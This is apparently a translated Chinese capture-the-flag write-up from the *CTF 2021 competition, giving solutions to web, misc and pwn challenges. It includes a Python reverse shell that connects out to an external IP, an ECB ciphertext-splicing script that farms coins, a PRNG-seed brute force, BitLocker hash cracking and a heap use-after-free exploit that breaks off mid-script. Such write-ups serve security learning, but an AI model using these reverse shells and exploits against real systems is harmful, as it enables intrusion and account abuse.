# *CTF2021 By 天璇Merak
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
非常感谢队里师傅的拼搏 打到第三名实属不易
## 2020 *CTF By 天璇Merak
## Web
###  lottery
ECB按照块加密，前后块不相关，开多个用户，把用户A的enc前两块，用户B的  
enc后三块拼起来，由于json同名变量覆盖特性，可以使得用户A的lottery为用户B充钱
    import requests
    import string
    import random
    import base64
    url = "http://52.149.144.45:8080/"
    def get_random_id():
        alphabet = list(string.ascii_lowercase + string.digits)
        return ''.join([random.choice(alphabet) for _ in range(16)])
    def login(username):
        data = {
            "username": username,
            "password": "zbrsb"
        }
        res = requests.post(url + "user/login", data=data)
        # print(res.text)
        return res.json()["user"], res.json()["user"]["api_token"]
    def register(username):
        data = {
            "username": username,
            "password": "zbrsb"
        }
        res = requests.post(url + "user/register", data=data)
        # print(res.text)
        return res.json()["user"]
    def getUserInfo(api_token):
        param = {
            "api_token": api_token
        }
        res = requests.get(url + "user/info", params=param)
        print(res.json()["user"]["coin"])
        return res.json()["user"]
    def getLotteryInfo(api_enc):
        data = {
            "enc": api_enc
        }
        res = requests.post(url + "lottery/info", data=data)
        print(res.text)
        return res.json()
    def buy(api_token):
        data = {
            "api_token": api_token
        }
        res = requests.post(url + "lottery/buy", data=data)
        return res.json()["enc"]
    def charge(userid, userenc):
        data = {
            "user": userid,
            "enc": userenc,
        }
        res = requests.post(url + "lottery/charge", data=data)
        # print(res.text)
        return res.json()
    def genEnc(myenc, enc):
        cur = base64.b64decode(enc).encode("hex")
        my = base64.b64decode(myenc).encode("hex")
        final = cur[:128] + my[64:]
        return base64.b64encode((final).decode("hex"))
    # usr,token = login("zbrsb")
    # print(usr,token)
    # buy(token)
    # usr,token = login("zbrsb2")
    # enc = "q19xM0nY5jhnDfX\/2wrKNDxC69J+Vda0SX3mFVdcecTZo5PDlwYy2KqH2dcqC4c2k3D4I8mZCk\/yataAxVJwPt32fDnmyH\/c5Tnq3lSJcxUbzgyDp3VOududj3AgXwymBjSyaFt2IKlwoR3d7w7jo+fD1fAWeDcaolVlMsw0nG4="
    usr, my_token = login("zbrsb")
    my_uuid = usr["uuid"]
    myenc ="ieNWhV8nVOrsaFSUKgo7cB9I4QS3NhuBUNfwa3xFunyxJo6k+N2RhrD5QLr9PQ8HcgPGkbQhV4ASoC/vEezABS8l0GpLbOdSz7eGq5xPr+CDbuWSPHJ2fltj6OMAtc7my6TxeH2KB7jwFBJ80Pmj5VyvoMKKdACWBUhZd1lHkzE="
    while True:
        name = "zbrsb" + get_random_id()
        register(name)
        usr, token = login(name)
        charge(my_uuid, genEnc(myenc=myenc, enc=buy(token)))
        getUserInfo(my_token)
    # print(genEnc(enc))
###  Socket
下载源码发现webserver端会 运行我们的代码  
那么考虑反弹Shell
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("175.24.87.217",7770))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
成功弹shell之后 ls 之后发现solve.py可能是上个队留下的。
就是打socket 打5001
    from socket import *
    try:
        tcpSerSock = socket(AF_INET, SOCK_STREAM)
        tcpSerSock.connect(('172.21.0.2', 21587))
        tcpSerSock.send(b'*ctf')
        #tcpSerSock.send(b'GET /file?name=%2Fproc%2Fself%2Fenviron HTTP/1.1\r\n\r\n')
        print(tcpSerSock.recv(1280))
    except Exception as e:
        print("ERROR", e)
###  on-my-note
审计发现是需要`note_id`和`post_at`来爆破得到`user_id`，再通过访问接口得到`user_id`所有的文章，构造exp
    #!/usr/bin/env python3
    import datetime
    import string
    import random
    import time
    from dateutil.parser import parse
    # From the app.py
    def get_random_id():
        alphabet = list(string.ascii_lowercase + string.digits)
        return ''.join([random.choice(alphabet) for _ in range(32)])
    # Gotten experimentally
    mytimezone_offset = 3600
    # Ones we were sure of
    post_at = '2021-01-15 02:29 UTC'
    note_id = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'
    timeStamp = float(time.mktime(time.strptime('2021-01-15 10:29', '%Y-%m-%d %H:%M')))
    found = False
    for s in range(60):
        if found:
            break
        for m in range(10000):
            cur_timeStamp = ((timeStamp+s)*10000+m)/10000
            #print(cur_timeStamp)
            time_in_ms = round(cur_timeStamp, 4)
            #print(time_in_ms)
            random.seed(time_in_ms)
            my_user_id = get_random_id()
            #post_at = datetime.datetime.fromtimestamp(time_in_ms, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
            #print(post_at)
            random.seed(my_user_id + post_at)
            my_note_id = get_random_id()
            if my_note_id.startswith(note_id[:5]):
                print(note_id)
                print(my_note_id)
                print('user_id', my_user_id)
                found = True
                break
注意`user_id`创建的时间应该是在`2021-01-15 02:29
UTC`甚至之前，这是`admin`发的第一个帖子，跑出admin用户的`user_id`：
访问API即可得到:
## Misc
###  Puzzle
万恶的拼图，似乎是因为加了噪的关系，各种脚本都跑不出来，用脚本拼图只能拼出来下面这种东西
其实能看出来flag在下面花的部分。找到原图之后调成半透明放到ppt里，开始经典拼图环节，把花里带字的块都挑出来慢慢拼  
最后拼成这样的时候其实已经能看出flag  
flag{you_can_never_finish_the}
###  签到
手速帝二血
###  feedback
wtf ? chess?
###  MineGame
直接下载了800M+的安装包，然后点了点发现点炸了或者 点了一阵就突然没了  
考虑到是有时间限制的。  
于是更改时间直接手玩拿flag了。
###  little tricks
改后缀vhdx发现可以挂载  
使用取证大师可以提取出加密得那一部分，  
而后我们考虑可以使用Bitlocker2john进行分析
    ./bitlocker2john.exe -i a.dd
得到Hashcat可以爆破得格式  
然后爆破得到密码12345678  
之后diskGenius直接打开  
发现其中的pdf  
直接得到flag。
## Pwn
###  babyheap
题目给了show和edit，而且存在uaf漏洞。唯一要解决的问题就是edit时无法修改前8个字节。所以多次free后将2个堆块放到fastbin中，再利用leave
name功能malloc一个较大的堆块造成fastbin consolidate。接下来就可以实现堆块的overlap，直接uaf改free
hook就行了。
exp:
    from pwn import *
    context.log_level='debug'
    def add(index,size):
        sh.sendafter('>> \n','1')
        sh.sendafter('index\n',index)
        sh.sendafter('size\n',str(size))
    def free(index):
        sh.sendafter('>> \n','2')
        sh.sendafter('index\n',index)
    def edit(index,content):
        sh.sendafter('>> \n','3')
        sh.sendafter('index\n',index)
        sh.sendafter('content\n',content)
    def show(index):
        sh.sendafter('>> \n','4')
        sh.sendafter('index\n',index)
    def l_name(name):
        sh.sendafter('>> \n','5')
        sh.sendafter('name:\n',name)
    #sh=process('./babyheap')
    #pause()
    sh=remote('52.152.231.198',8081)
    for i in range(9):
        add(str(i),0x40)
    for i in range(6):